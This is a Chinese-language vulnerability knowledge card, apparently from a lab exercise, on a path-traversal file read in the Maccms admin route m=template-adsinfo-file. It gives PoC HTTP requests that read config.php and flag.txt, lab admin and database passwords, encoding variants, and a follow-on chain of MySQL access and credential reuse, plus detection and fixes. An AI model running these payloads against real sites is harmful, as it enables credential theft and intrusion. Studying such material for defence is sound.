---
id: web-generic-file-inclusion-maccms-backend-template-adsinfo-file-traversal-read
title: Maccms 后台模板广告文件 m=template-adsinfo-file 参数路径穿越任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: maccms-template-adsinfo-file-traversal-read
tags:
- php
- maccms
- cms
- backend
- path-traversal
- arbitrary-file-read
- config-disclosure
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:39:22+08:00'
  notes: 已对照原文与截图核对：后台 m=template-adsinfo-file 路由把末段拼进读取路径，/admin%20/index.php?m=template-adsinfo-file-../../inc/config/config.php 读出 $MAC['db'] 明文口令（图16 显示 pass=cyberstrike@2024），../../../../flag.txt 读出 go-flag（图14），链路成立。核对修正：卡内 affected_versions 原写“Maccms 2021.1043（靶机后台显示版本；未给出影响区间）”，按规则属目标环境版本而非原文受影响区间，已 --clear；控制台确实显示当前版本 2021.1043（图12）。未验证点：未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-maccms-backend-template-adsinfo-file-traversal-read/
draft: false
kb_aliases:
- 苹果CMS 后台任意文件读取
- Maccms template-adsinfo-file
- 苹果CMS 模板广告文件读取
- maccms 读取 config.php
- Maccms 后台路径穿越
---

## 一句话结论

苹果CMS（Maccms）后台的模板广告文件编辑路由 `m=template-adsinfo-file-<file>` 把最后一段文件名直接拼进读取路径，登录后台后用 `../../` 穿越即可读取 `inc/config/config.php` 中的数据库明文口令、站点根目录 flag 以及服务器上任意可读文件。

## 原理

- Maccms 的 `m` 参数是“模块-控制器-动作-参数”的连字符路由；`template-adsinfo-file` 对应后台模板管理里的广告文件信息编辑功能，末尾的 `file` 值被当作要打开的文件名。
- 该功能的本意是只允许管理员编辑当前模板目录下的广告片段，但服务端读取时没有先 `realpath` 归一化并校验结果仍位于模板根目录，也没有过滤 `..` 和路径分隔符，拼接后的路径直接交给文件读取逻辑。
- 因此 `file` 段传入 `../../inc/config/config.php` 时，路径从模板目录向上回退到站点根，再进入 `inc/config/`，读出 Maccms 的主配置文件；配置文件里有 `$MAC['db']` 的 `server`、`port`、`name`、`user`、`pass`，其中数据库口令以明文存放。
- 同理把回退层数加深到站点根之外，可读取系统盘上的 flag、其他站点的配置、备份文件，甚至前人留下的 WebShell 源码（从中拿到一句话密码后可直接接管）。
- 之所以必须先登录后台：该路由在后台鉴权之后，攻击者通常先用后台弱口令进入；进入后文件读取本身不受模板目录限制，形成“后台弱口令 → 任意文件读取 → 数据库/主机凭据泄露”的链。
- 读取配置文件不需要代码执行，`open_basedir` 未覆盖站点根之外时也不影响；若 PHP 以低权限运行，仍能读取 Web 目录内的配置和源码，价值已经足够。

## 触发条件

- 目标为 Maccms（苹果CMS）且后台模板管理功能可访问；靶机版本为 2021.1043。
- 已获得后台管理员会话（弱口令、默认口令或其它后台入口）。
- `m=template-adsinfo-file-...` 路由未被 WAF/网关拦截，`file` 参数未做 `..` 过滤或白名单。
- Web 进程对目标文件有读权限；`open_basedir` 未把可读范围限制得过窄。
- 后台目录名可能被改名（靶机为 `admin `，URL 中编码为 `admin%20`），需要先确认实际后台路径。

## 利用步骤

1. 确认 Maccms 指纹并找到后台入口，用弱口令登录（靶机为 `admin / cslab`，安全码同为 `cslab`）。
2. 访问广告文件编辑路由，把 `file` 段替换为相对路径穿越：
   ```text
   /admin%20/index.php?m=template-adsinfo-file-../../inc/config/config.php
   ```
   `..` 的层数按后台目录与站点根的相对深度调整；若后台在站点根下的 `admin/`，通常两层即可到根。
3. 页面“广告代码”文本域会直接显示被读取文件的内容。从 `config.php` 中提取 `$MAC['db']['user']`、`$MAC['db']['pass']`、`$MAC['db']['name']`、`$MAC['db']['server']`。
4. 加深穿越层数读取站点根或系统盘上的 flag/敏感文件，例如：
   ```text
   /admin%20/index.php?m=template-adsinfo-file-../../../../flag.txt
   ```
5. 用泄露的数据库口令尝试直连 MySQL、复用至其它系统，或继续读取服务器上的 WebShell/备份文件扩大控制面。

## PoC

```http
GET /admin%20/index.php?m=template-adsinfo-file-../../inc/config/config.php HTTP/1.1
Host: 10.10.10.8
Cookie: <Maccms 后台会话>
```

响应中的“广告代码”区域返回配置文件内容，关键字段形如：

```php
<?php
$MAC = array(
  'db' => array(
    'type'   => 'mysql',
    'server' => '127.0.0.1',
    'port'   => '3306',
    'name'   => 'apple',
    'user'   => 'apple',
    'pass'   => '<明文数据库口令>',
    'tablepre' => 'mac_',
  ),
  ...
);
```

读取任意文件的变体：

```http
GET /admin%20/index.php?m=template-adsinfo-file-../../../../flag.txt HTTP/1.1
Host: 10.10.10.8
Cookie: <Maccms 后台会话>
```

返回 `go-flag{...}` 形式的 flag 内容。说明：靶机后台目录带空格并以 `%20` 编码；真实环境需按实际后台路径调整穿越层数。

## 变体与关联

- 变体：`file` 段可换成绝对路径（若服务端直接使用该值）、多重编码的 `..%2f`、反斜杠 `..\..\`（Windows）等，取决于过滤实现。
- 变体：同后台的模板管理、广告管理、数据库备份等其它以文件名为参数的功能点，可能复用同一套不安全的路径拼接；可按相同思路逐个测试。
- 变体：读到 `config.php` 的数据库口令后可直连 MySQL，枚举管理员表、重置后台口令或读取业务数据；口令若与主机/RDP/SSH 复用，可继续横向。
- 关联：[[web-generic-file-inclusion-metinfo-thumb-dir-config-read]]（CMS 后台路径穿越读取数据库配置的同类思路）、[[web-php-joomla-api-config-application-public-db-credential-leak]]（CMS 配置凭据泄露）、[[web-php-wordpress-backup-sql-phpass-credential]]（CMS 配置/备份泄露凭据）。
- 边界：后台口令强且无其它入口、`file` 参数改为白名单/`basename`、`open_basedir` 严格限制、后台被 IP 白名单保护时，本链不成立。

## 检测与防御

- 检测：后台访问日志中出现 `m=template-adsinfo-file` 且参数含 `../`、`..%2f`、`..\`、绝对路径或异常编码；同一会话在短时间内读取 `config.php`、`flag`、`1.php` 等敏感文件；后台弱口令登录与随后的异常文件读取相邻出现。
- 修复：升级 Maccms 到修复版本；对 `file` 参数做 `basename` 处理并校验 `realpath` 结果必须位于模板根目录内；拒绝 `..`、绝对路径和多层编码。
- 加固：后台使用强口令并启用安全码/验证码，限制后台来源 IP；`open_basedir` 限定到站点目录；数据库账号最小权限且口令不与主机复用；定期检查 Web 目录中遗留的 WebShell。
